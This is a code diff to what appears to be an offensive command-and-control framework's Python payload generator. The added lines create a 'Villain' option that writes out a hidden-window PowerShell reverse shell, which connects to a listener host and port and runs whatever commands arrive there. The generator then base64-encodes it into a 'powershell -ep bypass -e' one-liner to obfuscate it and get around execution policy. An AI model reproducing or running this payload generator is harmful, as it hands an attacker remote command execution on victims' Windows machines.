@@ -5,6 +5,7 @@
 #=========================#
 
 import os
+import base64
 import shutil
 
 def generate_webshell(app, tail, format, obfuscate):
@@ -57,13 +58,29 @@ def generate_payload(app, tail, file_format, listener_name):
     payloads_dir = "payloads"
     os.makedirs(payloads_dir, exist_ok=True)
 
+    listener_host = ""
+    listener_port = ""
+
     for listener in app.listeners:
         if listener["Name"] == listener_name:  
             listener_host = listener["Host"]
             listener_port = listener["Port"]
             break
 
-    if tail == "HTTP-Shell":
+    if tail == "Villain":
+        if file_format == "Ps1":
+            dst_name = "Villain_" + str(listener_port) + ".ps1"
+            dst_file = os.path.join(payloads_dir, dst_name.lower())
+            
+            content = '''Start-Process powershell.exe -ArgumentList {while ($true){$TCPClient = New-Object Net.Sockets.TCPClient('*LHOST*', *LPORT*);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String);$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()}} -WindowStyle Hidden'''
+            content = content.replace("*LHOST*", str(listener_host))
+            content = content.replace("*LPORT*", str(listener_port))
+            content = "powershell -ep bypass -e " + base64.b64encode(content.encode('utf16')[2:]).decode()
+
+            with open(dst_file, 'w') as file:
+                file.writelines(content)
+
+    elif tail == "HTTP-Shell":
         if file_format == "Ps1":
             src_file = "tails/HTTP-Shell/HTTP-Client.ps1"
             dst_name = "HTTP-Shell_" + str(listener_port) + ".ps1"
